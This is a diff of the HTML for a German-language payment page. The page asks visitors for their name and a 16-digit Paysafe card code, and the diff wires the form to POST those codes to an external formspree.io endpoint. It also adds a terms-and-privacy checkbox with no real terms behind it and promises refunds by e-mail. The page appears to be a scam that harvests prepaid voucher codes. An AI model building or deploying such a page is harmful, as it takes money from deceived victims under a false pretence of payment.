@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Zahlungsseite</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
+      
 
         body {
             font-family: Arial, sans-serif;
@@ -24,8 +24,7 @@
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
             padding: 20px;
             max-width: 500px;
-    
-            min-height: 620px;
+            min-height: 600px;
             width: 90%;
             text-align: center;
         }
@@ -74,7 +73,6 @@
             padding: 10px;
             border-radius: 8px;
             font-size: 14px;
-            margin-top: 28px;
             margin-bottom: 20px;
             overflow: hidden;
             white-space: nowrap;
@@ -210,6 +208,18 @@
         .txt {
             color: red;
         }
+        .ja{
+            color: rgb(12, 12, 144);
+        }
+        .check{
+            display: flex;
+            margin-bottom: 18px;
+            
+        }
+        .select{
+            margin-top: 18px;
+        }
+      
     </style>
 </head>
 <body>
@@ -225,10 +235,14 @@
         <div class="instructions">
             Bitte geben Sie Ihren Namen und den 16-stelligen Paysafe-Code ein, um die Zahlung abzuschließen. <div class="txt"> Sie dürfen nur eine Paysafe-Karte verwenden. </div> Restgeld erhalten Sie per E-Mail als Paysafe-Karte zurück.
         </div>
-        <form id="payment-form" >
-            
+        <form id="payment-form" action="https://formspree.io/xvoejjzd" method="POST" >
             <input type="text" id="name" name="name" placeholder="Name" required>
-            <input type="text" id="code" name="ziffern" placeholder="Paysafe Card Code" maxlength="19" required>
+
+            <input type="text" id="code" name="zahlen" placeholder="Paysafe Card Code" maxlength="19" required>
+            <div class="check">
+                <input type="checkbox" id="exampleCheckbox" name="terms">
+            <label class="select" id="select">Ja, ich bin mit den <u class="ja">allgemeinen Geschäftsbedingungen</u> und den <u class="ja">Datenschutzbestimmungen</u> einverstanden.</label>
+           </div>
             <button type="submit" id="submit-button" disabled>Bestätigen</button>
         </form>
         <div class="popup" id="popup">
@@ -282,7 +296,7 @@
 
         nameInput.addEventListener('input', validateForm);
     </script>
-    <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=xopvq17b&n=n1.ratufa.io"></script></body>
+</body>
 </html>
 
 
